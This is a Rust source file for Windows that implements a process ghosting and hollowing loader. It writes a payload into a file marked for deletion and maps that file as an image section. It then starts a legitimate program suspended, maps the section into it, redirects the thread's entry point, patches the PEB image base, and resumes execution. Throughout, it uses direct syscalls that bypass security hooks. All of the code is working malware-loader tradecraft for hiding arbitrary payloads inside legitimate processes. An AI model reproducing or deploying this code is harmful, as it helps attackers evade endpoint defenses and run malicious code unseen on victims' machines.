use std::ffi::c_void;
use std::mem::{zeroed};
use std::ops::Add;
use std::ptr::{null, null_mut};
use ccommon_fn::essentials;
use ccommon_fn::essentials::{initialize_object_attributes, rtl_init_unicode_string};
use memoffset::offset_of;
use winapi::um::winnt::CONTEXT_ALL;
use windows_sys::core::PWSTR;
use windows_sys::Wdk::Foundation::OBJECT_ATTRIBUTES;
use windows_sys::Wdk::Storage::FileSystem::{FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT};
use windows_sys::Wdk::System::Memory::ViewUnmap;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, OBJ_CASE_INSENSITIVE, TRUE, UNICODE_STRING};
use windows_sys::Win32::Storage::FileSystem::{DELETE, FILE_DISPOSITION_INFO, FILE_SHARE_READ, FILE_SHARE_WRITE, SYNCHRONIZE};
use windows_sys::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT, IMAGE_NT_HEADERS64};
use windows_sys::Win32::System::IO::IO_STATUS_BLOCK;
use windows_sys::Win32::System::Memory::{PAGE_READONLY, SECTION_ALL_ACCESS, SEC_IMAGE};
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE};
use windows_sys::Win32::System::Threading::{CreateProcessW, GetThreadId, CREATE_NEW_CONSOLE, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW};
use rust_syscalls::syscall;
use crate::{types};


pub unsafe fn fetch_entry_point_offset(p_file_buffer: *mut u8) -> u32 {
    let dos_header =p_file_buffer as *const IMAGE_DOS_HEADER;

    unsafe {
        let e_lfanew = (*dos_header).e_lfanew as usize;
        let p_img_nt_headers = p_file_buffer.add(e_lfanew) as *const IMAGE_NT_HEADERS64;
        if (*p_img_nt_headers).Signature != IMAGE_NT_SIGNATURE {
            return 0x00;
        }

        (*p_img_nt_headers).OptionalHeader.AddressOfEntryPoint
    }
}

pub unsafe fn hijack_remote_process_execution(
    process_handle: HANDLE,
    thread_handle: HANDLE,
    remote_base_addr: *mut c_void,
    entry_point_rva: u32
) -> Result<bool, &'static str> {

    let mut context = CONTEXT::default();
    context.ContextFlags = CONTEXT_ALL;
    let res = GetThreadContext(thread_handle, &mut context);
    if res == FALSE {
        return Err("GetThreadContext failed");
    }

    // Thread hijacking
    let new_addr = (remote_base_addr as usize).add(entry_point_rva as usize) as u64;
    context.Rcx = new_addr;
    println!("[*] Entry point address: {}", context.Rcx);

    // Process hollowing - get the offset to the PEB.ImageBase as element [PPEB is at Context.Rdx]
    let offset = offset_of!(types::PEB, ImageBase);
    let p_remote_img_base: *mut c_void = (context.Rdx).add(offset as u64) as *mut c_void;

    let res = SetThreadContext(thread_handle, &mut context);
    if res == FALSE {
        return Err("NtSetContextThread failed");
    }

    println!("[i] New image base address: {:p}", remote_base_addr);
    let mut p_remote_base_addr = remote_base_addr;

    // Write the payload's ImageBase into remote process' PEB
    let status = syscall!(
        "NtWriteVirtualMemory",
        process_handle,
        p_remote_img_base,
        &mut p_remote_base_addr,
        size_of::<u64>(),
        0usize
    );
    if status != 0 {
        eprintln!("[!] Status: {}", status);
        return Err("NtWriteVirtualMemory failed");
    }

    Ok(true)
}


pub unsafe fn create_ghost_section(
    sz_file_name: *const u16,
    p_file_buffer: *mut c_void,
    file_size: u32
) -> Result<HANDLE, &'static str> {

    if sz_file_name.is_null() || file_size == 0 || p_file_buffer.is_null() {
        return Err("Null arguments");
    }

    unsafe {
        let mut u_file_name: UNICODE_STRING = zeroed();
        let mut file_handle: HANDLE = INVALID_HANDLE_VALUE;
        let mut iosb: IO_STATUS_BLOCK = zeroed();

        rtl_init_unicode_string(
            &mut u_file_name as *mut UNICODE_STRING,
            sz_file_name
        );
        let mut obj_attr: OBJECT_ATTRIBUTES = initialize_object_attributes(
            &mut u_file_name as *mut UNICODE_STRING,
            OBJ_CASE_INSENSITIVE,
            null_mut(),
            null_mut())
        ;

        let status = syscall!(
            "NtOpenFile",
            &mut file_handle,
            DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
            &mut obj_attr,
            &mut iosb,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
        );
        if status != 0 || file_handle == INVALID_HANDLE_VALUE {
            return Err("NtOpenFile failed");
        }

        let mut file_disp_info = FILE_DISPOSITION_INFO { DeleteFile: true };

        let status = syscall!(
            "NtSetInformationFile",
            file_handle,
            &mut iosb,
            &mut file_disp_info as *mut _ as *mut c_void,
            size_of::<FILE_DISPOSITION_INFO>() as u32,
            13u32 // FileDispositionInformation
        );
        if status != 0 {
            return Err("NtSetInformationFile failed");
        }

        let mut byte_offset: types::LARGE_INTEGER = zeroed();
        let status = syscall!(
            "NtWriteFile",
            file_handle,
            0usize,
            0usize,
            0usize,
            &mut iosb,
            p_file_buffer,
            file_size,
            &mut byte_offset,
            0usize
        );
        if status != 0 {
            return Err("NtWriteFile failed");
        }

        let mut section_handle: HANDLE = zeroed();
        let status = syscall!(
            "NtCreateSection",
            &mut section_handle,
            SECTION_ALL_ACCESS,
            null::<usize>(),
            0x00,
            PAGE_READONLY,
            SEC_IMAGE,
            file_handle
        );
        if status != 0 {
            eprintln!("Status: {}", status);
            CloseHandle(file_handle);
            return Err("NtCreateSection failed");
        }

        CloseHandle(file_handle);
        Ok(section_handle)
    }
}

pub unsafe fn create_ghost_hollowing_process(
    sz_legit_pe_img: PWSTR,
    ghost_section_handle: HANDLE,
    p_payload_buffer: *mut u8
) -> Result<bool, &'static str> {

    const WCHAR_BACKSLASH: u16 = '\\' as u16;

    let mut process_info = PROCESS_INFORMATION::default();
    let mut startup_info = STARTUPINFOW::default(); // Zeroed
    startup_info.cb = size_of::<STARTUPINFOW>() as u32;

    unsafe {
        // extract process's current directory path
        let mut current_dir_path_box = essentials::wcsdup_box_owned(sz_legit_pe_img);
        let pwc_current_dir_path = current_dir_path_box.as_mut_ptr();

        let pwc_last_slash = essentials::wcsrchr(pwc_current_dir_path, WCHAR_BACKSLASH);
        if !pwc_last_slash.is_null() {
            *pwc_last_slash = 0;
        }

        // Create process
        let res = CreateProcessW(
            null(),
            sz_legit_pe_img,
            null(),
            null(),
            TRUE,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            null(),
            pwc_current_dir_path,
            &mut startup_info,
            &mut process_info
        );
        if res == FALSE {
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            CloseHandle(ghost_section_handle);
            eprintln!("[!] Error creating process: {}", GetLastError());
            return Err("CreateProcessW failed");
        }

        println!("[i] Ghost process created with id: {}", process_info.dwProcessId);

        let mut p_base_addr: *mut c_void = null_mut();
        let mut s_view_size: usize = 0;
        let status = syscall!(
            "NtMapViewOfSection",
            ghost_section_handle,
            process_info.hProcess,
            &mut p_base_addr,
            0,
            0usize,
            0usize,
            &mut s_view_size,
            ViewUnmap,
            null::<u32>(),
            PAGE_READONLY
        );
        if status != 0 {
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            CloseHandle(ghost_section_handle);
            return Err("NtMapViewOfSection failed");
        }

        println!("[i] Base address of the mapped ghost section: {:p}", p_base_addr);

        let entry_pnt_rva: u32 = fetch_entry_point_offset(p_payload_buffer);

        hijack_remote_process_execution(
            process_info.hProcess,
            process_info.hThread,
            p_base_addr,
            entry_pnt_rva
        ).expect("[!] Failed to hijack remote process");

        println!("[+] Resuming thread");
        let status = syscall!(
            "NtResumeThread",
            process_info.hThread,
            null::<usize>()
        );
        if status != 0 {
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            CloseHandle(ghost_section_handle);
            return Err("NtResumeThread failed");
        }

        println!("[*] Thread [ {} ] is hijacked to run the payload", GetThreadId(process_info.hThread));

        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
        CloseHandle(ghost_section_handle);
    }
    Ok(true)
}